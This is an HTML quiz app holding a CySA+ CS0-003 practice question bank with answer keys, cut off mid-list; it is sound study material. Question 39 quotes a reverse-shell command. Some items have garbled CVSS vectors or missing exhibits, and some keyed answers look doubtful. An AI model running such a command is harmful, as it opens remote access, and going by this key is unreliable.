<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name="theme-color" content="#07111f"><link rel="manifest" href="manifest.webmanifest"><link rel="apple-touch-icon" href="icon.svg"><title>CySA+ CS0-003</title><style>
:root{--bg:#07111f;--card:#0e2744;--card2:#153657;--text:#f6f8ff;--muted:#b7c9dd;--line:#35628e;--accent:#9ddcff;--good:#17c970;--bad:#ff5168;--warn:#ffd166}*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}body{margin:0;background:linear-gradient(180deg,#08192c,#07111f 280px);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;font-size:18px;padding-bottom:86px}.top{position:sticky;top:0;z-index:10;background:rgba(7,17,31,.97);backdrop-filter:blur(14px);border-bottom:1px solid #244d75;padding:calc(13px + env(safe-area-inset-top)) 13px 12px}.title{font-size:27px;font-weight:1000;letter-spacing:-.5px}.sub{color:var(--muted);font-size:14px;margin-top:3px}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}.stat{background:#102a47;border:1px solid var(--line);border-radius:14px;padding:9px;text-align:center;font-weight:900}.stat small{display:block;color:var(--muted);font-size:11px;margin-bottom:2px}.bar{height:10px;background:#061827;border-radius:999px;overflow:hidden;margin-top:10px;border:1px solid #244d75}.fill{height:100%;width:0;background:var(--accent)}.controls{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}.btn,input{min-height:50px;border:1px solid var(--line);background:#102a47;color:white;border-radius:15px;font-size:17px;font-weight:900}.btn{display:flex;align-items:center;justify-content:center}.btn.primary{background:#1a6eb0;border-color:#bde8ff}.search{grid-column:1/3;padding:0 14px}.wrap{padding:14px;max-width:760px;margin:auto}.mode{display:flex;gap:8px;overflow:auto;margin-bottom:12px}.pill{border:1px solid var(--line);background:#102a47;color:#fff;border-radius:999px;padding:9px 13px;white-space:nowrap;font-weight:900}.pill.on{background:var(--accent);color:#06111d}.card{background:var(--card);border:1px solid var(--line);border-radius:19px;overflow:hidden;box-shadow:0 10px 22px rgba(0,0,0,.22)}.qtop{background:var(--card2);padding:12px 14px;display:flex;justify-content:space-between;gap:8px;font-weight:1000}.qbody{padding:15px}.q{white-space:pre-wrap;font-weight:750;line-height:1.45}.opts{display:grid;gap:11px;margin-top:16px}.opt{position:relative;text-align:left;min-height:58px;padding:13px 48px 13px 12px;border-radius:15px;border:2px solid #37628b;background:#0a2038;color:white;font-size:18px;line-height:1.35;touch-action:manipulation;user-select:none}.opt:active{transform:scale(.985);background:#1b4f82}.letter{color:var(--accent);font-weight:1000;margin-right:5px}.opt.selected{background:#1f6fb2;border-color:#fff;box-shadow:0 0 0 4px rgba(157,220,255,.35)}.opt.correct{background:#08733e;border-color:#7dffb1;box-shadow:0 0 0 4px rgba(125,240,177,.33)}.opt.wrong{background:#8a1526;border-color:#ff9aa8;box-shadow:0 0 0 4px rgba(255,107,107,.35)}.opt.correct:after{content:'CORRECT';position:absolute;right:9px;top:10px;background:#7dffb1;color:#03130b;border-radius:999px;padding:3px 7px;font-size:11px;font-weight:1000}.opt.wrong:after{content:'YOUR PICK';position:absolute;right:9px;top:10px;background:#ffb3b3;color:#220206;border-radius:999px;padding:3px 7px;font-size:11px;font-weight:1000}.status{margin-top:14px;padding:14px;border-radius:14px;font-weight:1000;text-align:center;display:none}.status.good{display:block;background:#08733e;border:2px solid #7dffb1}.status.bad{display:block;background:#8a1526;border:2px solid #ff9aa8}.answer{margin-top:12px;background:#09251b;border-left:5px solid #7dffb1;border-radius:12px;padding:12px;display:none}.answer.show{display:block}.row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}.foot{position:fixed;left:0;right:0;bottom:0;z-index:11;background:rgba(7,17,31,.97);border-top:1px solid #244d75;padding:10px 12px calc(10px + env(safe-area-inset-bottom));display:grid;grid-template-columns:1fr 1fr;gap:10px}.tiny{font-size:13px;color:var(--muted);margin-top:10px}@media(max-width:390px){body{font-size:17px}.title{font-size:24px}.opt{font-size:17px;padding-right:42px}.controls{grid-template-columns:1fr}.search{grid-column:1}}</style></head><body><div class="top"><div class="title">CySA+ CS0-003</div><div class="sub">Installable iPhone PWA • saves progress • works offline after first load</div><div class="stats"><div class="stat"><small>Seen</small><span id="seen">0</span></div><div class="stat"><small>Correct</small><span id="correct">0</span></div><div class="stat"><small>Accuracy</small><span id="acc">0%</span></div></div><div class="bar"><div id="fill" class="fill"></div></div><div class="controls"><button class="btn primary" onclick="nextUnanswered()">Next Unanswered</button><button class="btn" onclick="randomQ()">Random</button><input id="search" class="search" placeholder="Search questions..." oninput="doSearch()"></div></div><main class="wrap"><div class="mode"><button class="pill on" id="mAll" onclick="setMode('all')">All</button><button class="pill" id="mMissed" onclick="setMode('missed')">Missed</button><button class="pill" id="mSaved" onclick="setMode('saved')">Bookmarked</button><button class="pill" onclick="resetProgress()">Reset</button></div><section class="card" id="card"></section><div class="tiny" id="count"></div></main><div class="foot"><button class="btn" onclick="prevQ()">Back</button><button class="btn primary" onclick="nextQ()">Next</button></div><script>const QUESTIONS=[{"id": 1, "question": "A recent zero-day vulnerability is being actively exploited, requires no user interaction or privilege escalation, and has a significant impact to\nconfidentiality and integrity but not to availability. Which of the following CVE metrics would be most accurate for this zero-day threat?", "options": [{"letter": "A", "text": "CVSS:31/AV:C:L/PR:N/UI:N/S:U/C:H/I:K/A:L"}, {"letter": "B", "text": "CVSS:31/AV:K/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L"}, {"letter": "C", "text": "CVSS:31/AV:C:L/PR:N/UI:H/S:U/C:L/I::H"}, {"letter": "D", "text": "CVSS:31/AV:L/AC:L/PR:R/UI:R/S:U/C:H/I:L/A:H"}], "answer": "A"}, {"id": 2, "question": "Which of the following tools would work best to prevent the exposure of PII outside of an organization?", "options": [{"letter": "A", "text": "PAM"}, {"letter": "B", "text": "IDS"}, {"letter": "C", "text": "PKI"}, {"letter": "D", "text": "DLP"}], "answer": "D"}, {"id": 3, "question": "An organization conducted a web application vulnerability assessment against the corporate website, and the following output was observed:\nWhich of the following tuning recommendations should the security analyst share?", "options": [{"letter": "A", "text": "Set an HttpOnly flag to force communication by HTTPS"}, {"letter": "B", "text": "Block requests without an X-Frame-Options header"}, {"letter": "C", "text": "Configure an Access-Control-Allow-Origin header to authorized domains"}, {"letter": "D", "text": "Disable the cross-origin resource sharing header"}], "answer": "B"}, {"id": 4, "question": "Which of the following items should be included in a vulnerability scan report? (Choose two.)", "options": [{"letter": "A", "text": "Lessons learned"}, {"letter": "B", "text": "Service-level agreement"}, {"letter": "C", "text": "Playbook"}, {"letter": "D", "text": "Affected hosts"}, {"letter": "E", "text": "Risk score"}, {"letter": "F", "text": "Education plan"}], "answer": "DE"}, {"id": 5, "question": "The Chief Executive Officer of an organization recently heard that exploitation of new attacks in the industry was happening approximately 45 days\nafter a patch was released. Which of the following would best protect this organization?", "options": [{"letter": "A", "text": "A mean time to remediate of 30 days"}, {"letter": "B", "text": "A mean time to detect of 45 days"}, {"letter": "C", "text": "A mean time to respond of 15 days"}, {"letter": "D", "text": "Third-party application testing"}], "answer": "A"}, {"id": 6, "question": "A security analyst recently joined the team and is trying to determine which scripting language is being used in a production script to determine if\nit is malicious. Given the following script:\nWhich of the following scripting languages was used in the script?", "options": [{"letter": "A", "text": "PowerShell"}, {"letter": "B", "text": "Ruby"}, {"letter": "C", "text": "Python"}, {"letter": "D", "text": "Shell script"}], "answer": "A"}, {"id": 7, "question": "A company's user accounts have been compromised. Users are also reporting that the company's internal portal is sometimes only accessible\nthrough HTTP, other times; it is accessible through HTTPS. Which of the following most likely describes the observed activity?", "options": [{"letter": "A", "text": "There is an issue with the SSL certificate causing port 443 to become unavailable for HTTPS access"}, {"letter": "B", "text": "An on-path attack is being performed by someone with internal access that forces users into port 80"}, {"letter": "C", "text": "The web server cannot handle an increasing amount of HTTPS requests so it forwards users to port 80"}, {"letter": "D", "text": "An error was caused by BGP due to new rules applied over the company's internal routers"}], "answer": "B"}, {"id": 8, "question": "A security analyst is tasked with prioritizing vulnerabilities for remediation. The relevant company security policies are shown below:\nSecurity Policy 1006: Vulnerability Management\n1. The Company shall use the CVSSv3.1 Base Score Metrics (Exploitability and Impact) to prioritize the remediation of security vulnerabilities.\n2. In situations where a choice must be made between confidentiality and availability, the Company shall prioritize confidentiality of data over\navailability of systems and data.\n3. The Company shall prioritize patching of publicly available systems and services over patching of internally available system.\nAccording to the security policy, which of the following vulnerabilities should be the highest priority to patch?", "options": [{"letter": "A", "text": "Name: THOR.HAMMER -\nCVSS:3.1/AV:C:L/PR:N/UI:N/S:U/C:N/I::H\nInternal System"}, {"letter": "B", "text": "Name: CAP.SHIELD -\nCVSS 3.1/AV:C:L/PR:N/UI:N/S:U/C:H/I::N\nExternal System"}, {"letter": "C", "text": "Name: LOKI.DAGGER -\nCVSS:3.1/AV:C:L/PR:N/UI:N/S:U/C:N/I::H\nExternal System"}, {"letter": "D", "text": "Name: THANOS.GAUNTLET -\nCVSS:3.1/AV:C:L/PR:N/UI:N/S:U/C:H/I::N\nInternal System"}], "answer": "B"}, {"id": 9, "question": "Which of the following will most likely ensure that mission-critical services are available in the event of an incident?", "options": [{"letter": "A", "text": "Business continuity plan"}, {"letter": "B", "text": "Vulnerability management plan"}, {"letter": "C", "text": "Disaster recovery plan"}, {"letter": "D", "text": "Asset management plan"}], "answer": "C"}, {"id": 10, "question": "The Chief Information Security Officer wants to eliminate and reduce shadow IT in the enterprise. Several high-risk cloud applications are used\nthat increase the risk to the organization. Which of the following solutions will assist in reducing the risk?", "options": [{"letter": "A", "text": "Deploy a CASB and enable policy enforcement"}, {"letter": "B", "text": "Configure MFA with strict access"}, {"letter": "C", "text": "Deploy an API gateway"}, {"letter": "D", "text": "Enable SSO to the cloud applications"}], "answer": "A"}, {"id": 11, "question": "An incident response team receives an alert to start an investigation of an internet outage. The outage is preventing all users in multiple locations\nfrom accessing external SaaS resources. The team determines the organization was impacted by a DDoS attack. Which of the following logs\nshould the team review first?", "options": [{"letter": "A", "text": "CDN"}, {"letter": "B", "text": "Vulnerability scanner"}, {"letter": "C", "text": "DNS"}, {"letter": "D", "text": "Web server"}], "answer": "C"}, {"id": 12, "question": "A malicious actor has gained access to an internal network by means of social engineering. The actor does not want to lose access in order to\ncontinue the attack. Which of the following best describes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?", "options": [{"letter": "A", "text": "Weaponization"}, {"letter": "B", "text": "Reconnaissance"}, {"letter": "C", "text": "Delivery"}, {"letter": "D", "text": "Exploitation"}], "answer": "D"}, {"id": 13, "question": "An analyst finds that an IP address outside of the company network that is being used to run network and vulnerability scans across external-\nfacing assets. Which of the following steps of an attack framework is the analyst witnessing?", "options": [{"letter": "A", "text": "Exploitation"}, {"letter": "B", "text": "Reconnaissance"}, {"letter": "C", "text": "Command and control"}, {"letter": "D", "text": "Actions on objectives"}], "answer": "B"}, {"id": 14, "question": "An incident response analyst notices multiple emails traversing the network that target only the administrators of the company. The email\ncontains a concealed URL that leads to an unknown website in another country. Which of the following best describes what is happening?\n(Choose two.)", "options": [{"letter": "A", "text": "Beaconing"}, {"letter": "B", "text": "Domain Name System hijacking"}, {"letter": "C", "text": "Social engineering attack"}, {"letter": "D", "text": "On-path attack"}, {"letter": "E", "text": "Obfuscated links"}, {"letter": "F", "text": "Address Resolution Protocol poisoning"}], "answer": "CE"}, {"id": 15, "question": "During security scanning, a security analyst regularly finds the same vulnerabilities in a critical application. Which of the following\nrecommendations would best mitigate this problem if applied along the SDLC phase?", "options": [{"letter": "A", "text": "Conduct regular red team exercises over the application in production"}, {"letter": "B", "text": "Ensure that all implemented coding libraries are regularly checked"}, {"letter": "C", "text": "Use application security scanning as part of the pipeline for the CI/CD flow"}, {"letter": "D", "text": "Implement proper input validation for any data entry form"}], "answer": "C"}, {"id": 16, "question": "An analyst is reviewing a vulnerability report and must make recommendations to the executive team. The analyst finds that most systems can be\nupgraded with a reboot resulting in a single downtime window. However, two of the critical systems cannot be upgraded due to a vendor appliance\nthat the company does not have access to. Which of the following inhibitors to remediation do these systems and associated vulnerabilities best\nrepresent?", "options": [{"letter": "A", "text": "Proprietary systems"}, {"letter": "B", "text": "Legacy systems"}, {"letter": "C", "text": "Unsupported operating systems"}, {"letter": "D", "text": "Lack of maintenance windows"}], "answer": "B"}, {"id": 17, "question": "The security team reviews a web server for XSS and runs the following Nmap scan:\nWhich of the following most accurately describes the result of the scan?", "options": [{"letter": "A", "text": "An output of characters > and \" as the parameters used m the attempt"}, {"letter": "B", "text": "The vulnerable parameter ID http://172.31.15.2/1.php?id-2 and unfiltered characters returned"}, {"letter": "C", "text": "The vulnerable parameter and unfiltered or encoded characters passed > and \" as unsafe"}, {"letter": "D", "text": "The vulnerable parameter and characters > and \" with a reflected XSS attempt"}], "answer": "D"}, {"id": 18, "question": "Which of the following is the best action to take after the conclusion of a security incident to improve incident response in the future?", "options": [{"letter": "A", "text": "Develop a call tree to inform impacted users"}, {"letter": "B", "text": "Schedule a review with all teams to discuss what occurred"}, {"letter": "C", "text": "Create an executive summary to update company leadership"}, {"letter": "D", "text": "Review regulatory compliance with public relations for official notification"}], "answer": "B"}, {"id": 19, "question": "A security analyst received a malicious binary file to analyze. Which of the following is the best technique to perform the analysis?", "options": [{"letter": "A", "text": "Code analysis"}, {"letter": "B", "text": "Static analysis"}, {"letter": "C", "text": "Reverse engineering"}, {"letter": "D", "text": "Fuzzing"}], "answer": "B"}, {"id": 20, "question": "An incident response team found IoCs in a critical server. The team needs to isolate and collect technical evidence for further investigation. Which\nof the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?", "options": [{"letter": "A", "text": "Hard disk"}, {"letter": "B", "text": "Primary boot partition"}, {"letter": "C", "text": "Malicious files"}, {"letter": "D", "text": "Routing table"}, {"letter": "E", "text": "Static IP address"}], "answer": "C"}, {"id": 21, "question": "Which of the following security operations tasks are ideal for automation?", "options": [{"letter": "A", "text": "Suspicious file analysis:\nLook for suspicious-looking graphics in a folder.\nCreate subfolders in the original folder based on category of graphics found.\nMove the suspicious graphics to the appropriate subfolder"}, {"letter": "B", "text": "Firewall IoC block actions:\nExamine the firewall logs for IoCs from the most recently published zero-day exploit\nTake mitigating actions in the firewall to block the behavior found in the logs\nFollow up on any false positives that were caused by the block rules"}, {"letter": "C", "text": "Security application user errors:\nSearch the error logs for signs of users having trouble with the security application\nLook up the user's phone number -\nCall the user to help with any questions about using the application"}, {"letter": "D", "text": "Email header analysis:\nCheck the email header for a phishing confidence metric greater than or equal to five\nAdd the domain of sender to the block list\nMove the email to quarantine"}], "answer": "B"}, {"id": 22, "question": "An organization has experienced a breach of customer transactions. Under the terms of PCI DSS, which of the following groups should the\norganization report the breach to?", "options": [{"letter": "A", "text": "PCI Security Standards Council"}, {"letter": "B", "text": "Local law enforcement"}, {"letter": "C", "text": "Federal law enforcement"}, {"letter": "D", "text": "Card issuer"}], "answer": "D"}, {"id": 23, "question": "Which of the following is the best metric for an organization to focus on given recent investments in SIEM, SOAR, and a ticketing system?", "options": [{"letter": "A", "text": "Mean time to detect"}, {"letter": "B", "text": "Number of exploits by tactic"}, {"letter": "C", "text": "Alert volume"}, {"letter": "D", "text": "Quantity of intrusion attempts"}], "answer": "A"}, {"id": 24, "question": "A company is implementing a vulnerability management program and moving from an on-premises environment to a hybrid IaaS cloud\nenvironment. Which of the following implications should be considered on the new hybrid environment?", "options": [{"letter": "A", "text": "The current scanners should be migrated to the cloud"}, {"letter": "B", "text": "Cloud-specific misconfigurations may not be detected by the current scanners"}, {"letter": "C", "text": "Existing vulnerability scanners cannot scan IaaS systems"}, {"letter": "D", "text": "Vulnerability scans on cloud environments should be performed from the cloud"}], "answer": "B"}, {"id": 25, "question": "A security alert was triggered when an end user tried to access a website that is not allowed per organizational policy. Since the action is\nconsidered a terminable offense, the SOC analyst collects the authentication logs, web logs, and temporary files, reflecting the web searches from\nthe user's workstation, to build the case for the investigation. Which of the following is the best way to ensure that the investigation complies with\nHR or privacy policies?", "options": [{"letter": "A", "text": "Create a timeline of events detailing the date stamps, user account hostname and IP information associated with the activities"}, {"letter": "B", "text": "Ensure that the case details do not reflect any user-identifiable information Password protect the evidence and restrict access to personnel\nrelated to the investigation"}, {"letter": "C", "text": "Create a code name for the investigation in the ticketing system so that all personnel with access will not be able to easily identify the case\nas an HR-related investigation"}, {"letter": "D", "text": "Notify the SOC manager for awareness after confirmation that the activity was intentional"}], "answer": "B"}, {"id": 26, "question": "Which of the following is the first step that should be performed when establishing a disaster recovery plan?", "options": [{"letter": "A", "text": "Agree on the goals and objectives of the plan"}, {"letter": "B", "text": "Determine the site to be used during a disaster"}, {"letter": "C", "text": "Demonstrate adherence to a standard disaster recovery process"}, {"letter": "D", "text": "Identify applications to be run during a disaster"}], "answer": "A"}, {"id": 27, "question": "A technician identifies a vulnerability on a server and applies a software patch. Which of the following should be the next step in the remediation\nprocess?", "options": [{"letter": "A", "text": "Testing"}, {"letter": "B", "text": "Implementation"}, {"letter": "C", "text": "Validation"}, {"letter": "D", "text": "Rollback"}], "answer": "C"}, {"id": 28, "question": "The analyst reviews the following endpoint log entry:\nWhich of the following has occurred?", "options": [{"letter": "A", "text": "Registry change"}, {"letter": "B", "text": "Rename computer"}, {"letter": "C", "text": "New account introduced"}, {"letter": "D", "text": "Privilege escalation"}], "answer": "C"}, {"id": 29, "question": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to\njump between tools. Which of the following best describes what the security program did?", "options": [{"letter": "A", "text": "Data enrichment"}, {"letter": "B", "text": "Security control plane"}, {"letter": "C", "text": "Threat feed combination"}, {"letter": "D", "text": "Single pane of glass"}], "answer": "D"}, {"id": 30, "question": "Due to reports of unauthorized activity that was occurring on the internal network, an analyst is performing a network discovery. The analyst runs\nan Nmap scan against a corporate network to evaluate which devices were operating in the environment. Given the following output:\nWhich of the following choices should the analyst look at first?", "options": [{"letter": "A", "text": "wh4dc-748gy.lan (192.168.86.152)"}, {"letter": "B", "text": "officerckuplayer.lan (192.168.86.22)"}, {"letter": "C", "text": "imaging.lan (192.168.86.150)"}, {"letter": "D", "text": "xlaptop.lan (192.168.86.249)"}, {"letter": "E", "text": "p4wnp1_aloa.lan (192.168.86.56)"}], "answer": "E"}, {"id": 31, "question": "When starting an investigation, which of the following must be done first?", "options": [{"letter": "A", "text": "Notify law enforcement"}, {"letter": "B", "text": "Secure the scene"}, {"letter": "C", "text": "Seize all related evidence"}, {"letter": "D", "text": "Interview the witnesses"}], "answer": "B"}, {"id": 32, "question": "Which of the following describes how a CSIRT lead determines who should be communicated with and when during a security incident?", "options": [{"letter": "A", "text": "The lead should review what is documented in the incident response policy or plan"}, {"letter": "B", "text": "Management level members of the CSIRT should make that decision"}, {"letter": "C", "text": "The lead has the authority to decide who to communicate with at any t me"}, {"letter": "D", "text": "Subject matter experts on the team should communicate with others within the specified area of expertise"}], "answer": "A"}, {"id": 33, "question": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization. Which of the following will\nproduce the data needed for the briefing?", "options": [{"letter": "A", "text": "Firewall logs"}, {"letter": "B", "text": "Indicators of compromise"}, {"letter": "C", "text": "Risk assessment"}, {"letter": "D", "text": "Access control lists"}], "answer": "B"}, {"id": 34, "question": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the header to a known-malicious IP in another\ncountry. Which of the following describes what the analyst has noticed?", "options": [{"letter": "A", "text": "Beaconing"}, {"letter": "B", "text": "Cross-site scripting"}, {"letter": "C", "text": "Buffer overflow"}, {"letter": "D", "text": "PHP traversal"}], "answer": "A"}, {"id": 35, "question": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst\nsets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list\npane is not showing the packets containing the file transfer itself. Which of the following can the analyst perform to see the entire contents of the\ndownloaded files?", "options": [{"letter": "A", "text": "Change the display filter to ftp.active.port"}, {"letter": "B", "text": "Change the display filter to tcp.port==20"}, {"letter": "C", "text": "Change the display filter to ftp-data and follow the TCP streams"}, {"letter": "D", "text": "Navigate to the File menu and select FTP from the Export objects option"}], "answer": "C"}, {"id": 36, "question": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago: but the report did not\nhave a follow-up remediation response from an analyst. Which of the following documents should the SOC manager review to ensure the team is\nmeeting the appropriate contractual obligations for the customer?", "options": [{"letter": "A", "text": "SLA"}, {"letter": "B", "text": "MOU"}, {"letter": "C", "text": "NDA"}, {"letter": "D", "text": "Limitation of liability"}], "answer": "A"}, {"id": 37, "question": "Which of the following phases of the Cyber Kill Chain involves the adversary attempting to establish communication with a successfully exploited\ntarget?", "options": [{"letter": "A", "text": "Command and control"}, {"letter": "B", "text": "Actions on objectives"}, {"letter": "C", "text": "Exploitation"}, {"letter": "D", "text": "Delivery"}], "answer": "A"}, {"id": 38, "question": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a vulnerability scanning method with reduced\nnetwork traffic. Which of the following would best meet this requirement?", "options": [{"letter": "A", "text": "External"}, {"letter": "B", "text": "Agent-based"}, {"letter": "C", "text": "Non-credentialed"}, {"letter": "D", "text": "Credentialed"}], "answer": "B"}, {"id": 39, "question": "A security analyst detects an exploit attempt containing the following command: sh -i >& /dev/udp/10.1.1.1/4821 0>$l\nWhich of the following is being attempted?", "options": [{"letter": "A", "text": "RCE"}, {"letter": "B", "text": "Reverse shell"}, {"letter": "C", "text": "XSS"}, {"letter": "D", "text": "SQL injection"}], "answer": "B"}, {"id": 40, "question": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware.\nWhich of the following factors would an analyst most likely communicate as the reason for this escalation?", "options": [{"letter": "A", "text": "Scope"}, {"letter": "B", "text": "Weaponization"}, {"letter": "C", "text": "CVSS"}, {"letter": "D", "text": "Asset value"}], "answer": "B"}, {"id": 41, "question": "An analyst is reviewing a vulnerability report for a server environment with the following entries:\nWhich of the following systems should be prioritized for patching first?", "options": [{"letter": "A", "text": "10.101.27.98"}, {"letter": "B", "text": "54.73.225.17"}, {"letter": "C", "text": "54.74.110.26"}, {"letter": "D", "text": "54.74.110.228"}], "answer": "D"}, {"id": 42, "question": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team\naccess to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most\naccurate vulnerability scan results?", "options": [{"letter": "A", "text": "Credentialed network scanning"}, {"letter": "B", "text": "Passive scanning"}, {"letter": "C", "text": "Agent-based scanning"}, {"letter": "D", "text": "Dynamic scanning"}], "answer": "A"}, {"id": 43, "question": "A security analyst is trying to identify anomalies on the network routing. Which of the following functions can the analyst use on a shell script to\nachieve the objective most accurately?", "options": [{"letter": "A", "text": "function x() { info=$(geoiplookup $1) && echo \"$1 | $info\" }"}, {"letter": "B", "text": "function x() { info=$(ping -c 1 $1 | awk -F \"/\" ’END{print $5}’) && echo \"$1 | $info\" }"}, {"letter": "C", "text": "function x() { info=$(dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F \".in-addr\" ’{print $1} ').origin.asn.cymru.com TXT +short) && echo \"$1 |\n$info\" }"}, {"letter": "D", "text": "function x() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo \"$1 | $info\" }"}], "answer": "C"}, {"id": 44, "question": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture\nagainst this threat. Which of the following security controls would best support the company in this scenario?", "options": [{"letter": "A", "text": "Implement step-up authentication for administrators"}, {"letter": "B", "text": "Improve employee training and awareness"}, {"letter": "C", "text": "Increase password complexity standards"}, {"letter": "D", "text": "Deploy mobile device management"}], "answer": "B"}, {"id": 45, "question": "Which of the following is the best way to begin preparation for a report titled \"What We Learned\" regarding a recent incident involving a\ncybersecurity breach?", "options": [{"letter": "A", "text": "Determine the sophistication of the audience that the report is meant for"}, {"letter": "B", "text": "Include references and sources of information on the first page"}, {"letter": "C", "text": "Include a table of contents outlining the entire report"}, {"letter": "D", "text": "Decide on the color scheme that will effectively communicate the metrics"}], "answer": "A"}, {"id": 46, "question": "A security analyst is performing an investigation involving multiple targeted Windows malware binaries. The analyst wants to gather intelligence\nwithout disclosing information to the attackers. Which of the following actions would allow the analyst to achieve the objective?", "options": [{"letter": "A", "text": "Upload the binary to an air gapped sandbox for analysis"}, {"letter": "B", "text": "Send the binaries to the antivirus vendor"}, {"letter": "C", "text": "Execute the binaries on an environment with internet connectivity"}, {"letter": "D", "text": "Query the file hashes using VirusTotal"}], "answer": "A"}, {"id": 47, "question": "Which of the following would help to minimize human engagement and aid in process improvement in security operations?", "options": [{"letter": "A", "text": "OSSTMM"}, {"letter": "B", "text": "SIEM"}, {"letter": "C", "text": "SOAR"}, {"letter": "D", "text": "OWASP"}], "answer": "C"}, {"id": 48, "question": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score\nwould be too high. The CISO refused the software request. Which of the following risk management principles did the CISO select?", "options": [{"letter": "A", "text": "Avoid"}, {"letter": "B", "text": "Transfer"}, {"letter": "C", "text": "Accept"}, {"letter": "D", "text": "Mitigate"}], "answer": "A"}, {"id": 49, "question": "Which of the following is an important aspect that should be included in the lessons-learned step after an incident?", "options": [{"letter": "A", "text": "Identify any improvements or changes in the incident response plan or procedures"}, {"letter": "B", "text": "Determine if an internal mistake was made and who did it so they do not repeat the error"}, {"letter": "C", "text": "Present all legal evidence collected and turn it over to iaw enforcement"}, {"letter": "D", "text": "Discuss the financial impact of the incident to determine if security controls are well spent"}], "answer": "A"}, {"id": 50, "question": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals. Which of the\nfollowing will best achieve the goal and maximize results?", "options": [{"letter": "A", "text": "Single pane of glass"}, {"letter": "B", "text": "Single sign-on"}, {"letter": "C", "text": "Data enrichment"}, {"letter": "D", "text": "Deduplication"}], "answer": "A"}, {"id": 51, "question": "Which of the following would a security analyst most likely use to compare TTPs between different known adversaries of an organization?", "options": [{"letter": "A", "text": "MITRE ATT&CK"}, {"letter": "B", "text": "Cyber Kill Cham"}, {"letter": "C", "text": "OWASP"}, {"letter": "D", "text": "STIX/TAXII"}], "answer": "A"}, {"id": 52, "question": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the\nsystem. Which of the following steps of the process does this describe?", "options": [{"letter": "A", "text": "Eradication"}, {"letter": "B", "text": "Recovery"}, {"letter": "C", "text": "Containment"}, {"letter": "D", "text": "Preparation"}], "answer": "A"}, {"id": 53, "question": "Joe, a leading sales person at an organization, has announced on social media that he is leaving his current role to start a new company that will\ncompete with his current employer. Joe is soliciting his current employer's customers. However, Joe has not resigned or discussed this with his\ncurrent supervisor yet. Which of the following would be the best action for the incident response team to recommend?", "options": [{"letter": "A", "text": "Isolate Joe's PC from the network"}, {"letter": "B", "text": "Reimage the PC based on standard operating procedures"}, {"letter": "C", "text": "Initiate a remote wipe of Joe's PC using mobile device management"}, {"letter": "D", "text": "Perform no action until HR or legal counsel advises on next steps"}], "answer": "D"}, {"id": 54, "question": "The Chief Information Security Officer is directing a new program to reduce attack surface risks and threats as part of a zero trust approach. The\nIT security team is required to come up with priorities for the program. Which of the following is the best priority based on common attack\nframeworks?", "options": [{"letter": "A", "text": "Reduce the administrator and privileged access accounts"}, {"letter": "B", "text": "Employ a network-based IDS"}, {"letter": "C", "text": "Conduct thorough incident response"}, {"letter": "D", "text": "Enable SSO to enterprise applications"}], "answer": "A"}, {"id": 55, "question": "During an extended holiday break, a company suffered a security incident. This information was properly relayed to appropriate personnel in a\ntimely manner and the server was up to date and configured with appropriate auditing and logging. The Chief Information Security Officer wants to\nfind out precisely what happened. Which of the following actions should the analyst take first?", "options": [{"letter": "A", "text": "Clone the virtual server for forensic analysis"}, {"letter": "B", "text": "Log m to the affected server and begin analysis of the logs"}, {"letter": "C", "text": "Restore from the last known-good backup to confirm there was no loss of connectivity"}, {"letter": "D", "text": "Shut down the affected server immediately"}], "answer": "D"}, {"id": 56, "question": "A systems administrator is reviewing after-hours traffic flows from data-center servers and sees regular outgoing HTTPS connections from one of\nthe servers to a public IP address. The server should not be making outgoing connections after hours. Looking closer, the administrator sees this\ntraffic pattern around the clock during work hours as well. Which of the following is the most likely explanation?", "options": [{"letter": "A", "text": "C2 beaconing activity"}, {"letter": "B", "text": "Data exfiltration"}, {"letter": "C", "text": "Anomalous activity on unexpected ports"}, {"letter": "D", "text": "Network host IP address scanning"}, {"letter": "E", "text": "A rogue network device"}], "answer": "A"}, {"id": 57, "question": "New employees in an organization have been consistently plugging in personal webcams despite the company policy prohibiting use of personal\ndevices. The SOC manager discovers that new employees are not aware of the company policy. Which of the following will the SOC manager most\nlikely recommend to help ensure new employees are accountable for following the company policy?", "options": [{"letter": "A", "text": "Human resources must email a copy of a user agreement to all new employees"}, {"letter": "B", "text": "Supervisors must get verbal confirmation from new employees indicating they have read the user agreement"}, {"letter": "C", "text": "All new employees must take a test about the company security policy during the onboardmg process"}, {"letter": "D", "text": "All new employees must sign a user agreement to acknowledge the company security policy"}], "answer": "D"}, {"id": 58, "question": "An analyst has been asked to validate the potential risk of a new ransomware campaign that the Chief Financial Officer read about in the\nnewspaper. The company is a manufacturer of a very small spring used in the newest fighter jet and is a critical piece of the supply chain for this\naircraft. Which of the following would be the best threat intelligence source to learn about this new campaign?", "options": [{"letter": "A", "text": "Information sharing organization"}, {"letter": "B", "text": "Blogs/forums"}, {"letter": "C", "text": "Cybersecurity incident response team"}, {"letter": "D", "text": "Deep/dark web"}], "answer": "A"}, {"id": 59, "question": "An 